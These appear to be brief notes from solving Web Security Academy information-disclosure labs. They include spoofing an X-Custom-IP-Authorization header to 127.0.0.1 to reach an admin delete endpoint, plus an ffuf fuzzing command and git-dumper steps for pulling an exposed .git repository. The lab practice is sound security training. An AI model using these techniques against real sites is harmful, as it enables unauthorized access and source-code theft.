```
phpinfo
robots
error traces
backup files exposed
TRACE /admin information disclosure
```
##### Custom HTTP headers?
use OPTIONS for protocols
use TRACE for headers
Notice X-Custom-IP-Authorization: 81.33.215.45 is being reflected
add X-Custom-IP-Authorization: with 127.0.0.1
GET /admin/delete?username=carlos

##### git exposed
/ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u https://0af200f8048145328134cb5100bb00a3.web-security-academy.net/FUZZ -fc 404
.git found
https://github.com/arthaud/git-dumper
git status
git reset --hard
git show ..
